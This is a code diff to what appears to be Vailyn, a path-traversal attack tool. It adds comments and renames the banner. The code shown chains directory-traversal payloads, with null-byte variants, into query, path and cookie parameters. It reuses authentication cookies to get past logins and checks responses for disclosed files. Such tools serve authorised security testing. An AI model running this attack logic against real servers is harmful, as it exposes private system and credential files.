@@ -13,7 +13,7 @@ _____, ___
       ,   
        
 
-┌─[pathtrav]─[~]
+┌─[Vailyn]─[~]
 └──╼ VainlyStrain
 """
 
@@ -63,11 +63,15 @@ def query(traverse, dir, file, nb, keyword, url, url2):
 @authcookie: Authentication Cookie File to bypass Login Screens
 """
 def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file, authcookie):
-    #resolve issues with inpath attack
+    #variables for the progress counter
     requestcount = 0
     totalrequests = len(paylist) * (len(nullchars) + 1) * depth
+
+    #resolve issues with inpath attack
     if not url.endswith("/"):
         url += "/"
+
+    #initialize lists & session
     payloads = []
     nullbytes = []
     s = session()
@@ -77,6 +81,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
         tmpjar = cookieFromFile(authcookie)
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
+
     #initial ping for filecheck
     con2 = requests.get(url).content
     for i in paylist:
@@ -84,9 +89,12 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
         while d <= depth:
             traverse=''
             j=1
+            #chain traversal payloads
             while j <= d:
                 traverse+=i
                 j+=1
+
+            #send attack requests - no nullbyte injection
             requestlist = []
             if attack == 1:
                 prep, p = query(traverse, "", file, "", keyword, url, url2)
@@ -99,6 +107,8 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                 p = traverse + file
                 r = s.get(url)
             requestlist.append((r, p, ""))
+
+            #repeat for nullbytes
             for nb in nullchars:
                 if attack == 1:
                     prep, p = query(traverse, "", file, nb, keyword, url, url2)
@@ -111,6 +121,8 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                     p = traverse + file + nb
                     r = s.get(url)
                 requestlist.append((r, p, nb))
+
+            #analyze result
             found = False
             for (r, p, nb) in requestlist:
                 requestcount += 1
@@ -151,14 +163,18 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
 @authcookie: Authentication Cookie File to bypass Login Screens
 """
 def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, verbose, dl, selected_payloads, selected_nullbytes, authcookie):
-    #resolve issues with inpath attack and loot function
+    #variables for the progress counter
     requestcount = 0
     if len(selected_nullbytes) == 0:
         totalrequests = len(selected_payloads) * len(files) * len(dirs) * depth
     else:
         totalrequests = len(selected_payloads) * len(selected_nullbytes) * len(files) * len(dirs) * depth
+
+    #resolve issues with inpath attack and loot function
     if not url.endswith("/"):
         url += "/"
+
+    #initialize lists & session
     found=[]
     urls = []
     s = session()
@@ -168,6 +184,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
         tmpjar = cookieFromFile(authcookie)
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
+
     #initial ping for filecheck
     con2 = requests.get(url).content
     for dir in dirs:
@@ -177,9 +194,12 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                 for i in selected_payloads:
                     traverse=''
                     j=1
+                    #chain traversal payloads
                     while j <= d:
                         traverse+=i
                         j+=1
+
+                    #send attack requests - with or without nullbyte injection
                     requestlist = []
                     if selected_nullbytes == []:
                         if attack == 1:
@@ -206,6 +226,8 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                 s.cookies.set(selected, traverse + dir + file + nb)
                                 r = s.get(url)
                             requestlist.append((r,p))
+
+                    #analyze result
                     for (r,p) in requestlist:
                         requestcount += 1
                         progress(requestcount, totalrequests, prefix=" ", suffix=" ")
